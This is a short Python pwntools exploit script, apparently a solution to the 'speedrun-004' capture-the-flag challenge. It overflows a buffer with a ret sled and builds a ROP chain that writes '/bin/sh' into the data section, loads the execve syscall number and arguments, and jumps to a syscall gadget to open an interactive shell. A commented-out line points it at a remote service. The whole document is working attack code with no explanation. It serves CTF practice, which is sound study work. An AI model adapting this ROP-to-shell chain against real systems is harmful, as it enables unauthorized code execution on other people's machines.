#!/usr/bin/env python3
from pwn import *

r = process("./speedrun-004")
pause()
# r = remote("172.17.0.6", 31337)
ret = 0x400416
pop_rdi = 0x400686
pop_rsi = 0x410a93
pop_rax = 0x415f04
pop_rdx = 0x44a155
mov_rax_rdx = 0x418c37
data_section = 0x6b90e0
vuln_function = 0x400b73

r.recv()
r.sendline("257")
r.recv()

payload = p64(ret)*18
payload += p64(pop_rax)
payload += p64(0x0068732f6e69622f)
payload += p64(pop_rdx)
payload += p64(data_section)
payload += p64(mov_rax_rdx)
payload += p64(pop_rdi)
payload += p64(data_section)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(0x40132c)
# payload += p64(pop_rdi)
# payload += p64(400)
# payload += p64(vuln_function)
payload += b"\x00"
r.send(payload)
print(r.recv())

r.interactive()
